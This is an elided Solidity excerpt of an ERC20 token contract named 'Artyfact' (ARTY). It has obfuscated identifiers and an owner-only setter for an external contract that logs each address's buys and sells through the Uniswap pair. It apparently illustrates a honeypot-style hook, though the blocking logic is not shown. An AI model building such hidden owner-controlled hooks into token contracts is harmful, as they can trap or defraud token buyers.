...
contract TokenM is ERC20 {
    ...
    IUserAmountueusut public ueusut;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Artyfact", "ARTY") {
    ...
    function cuueeterBooingRssd(IUserAmountueusut _ueusut) public onlyOwner {
        ueusut = _ueusut;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                ueusut.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				ueusut.addOutAmount(from, amount);
            }else{
                ueusut.addOutAmount(from, amount);
                takeFee = false;
            }
